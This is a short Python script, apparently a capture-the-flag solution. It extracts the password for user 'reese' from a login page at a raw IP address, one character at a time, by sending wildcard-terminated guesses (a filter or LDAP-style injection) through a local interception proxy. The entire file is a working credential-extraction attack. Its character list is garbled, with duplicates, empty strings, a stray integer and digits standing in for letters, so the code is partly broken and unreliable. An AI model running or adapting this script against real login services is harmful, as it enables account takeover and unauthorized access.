import requests

list = ['a', 'b','c','d', 'e','f','g','h','i', 'j', 'k', 'l', 'm', 'n','o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B','C', 'D', 'E', 'F', 'G', 'H','I','3','K','T', 'M', 'N','0','P', 'Q', 'R','S','T','U','1','W', 'X', 'Y','Z','!','"','#','$','%','&',"'",'(',')','+',',', 17,':','1','','','>','?', '@','[',']','^','_','`','{','|','}','~','1','2','3', '4', '5', '6', '7', '8', '9','0'] 

url = 'http://139.59.175.51:31101/login'
myobj = {'username': 'reese', 'password': 'somevalue' }
result = ''
flag = 1
while flag == 1:
		flag = 0
		for l in list:
				myobj['password'] = result + l + '*'
				r = requests.post(url, data = myobj, proxies = { "http" : "http://127.0.0.1:8080"})
				if ('No search results' in r.text):
						result += l
						flag = 1
						print(result)
						break
print('Finish!!')
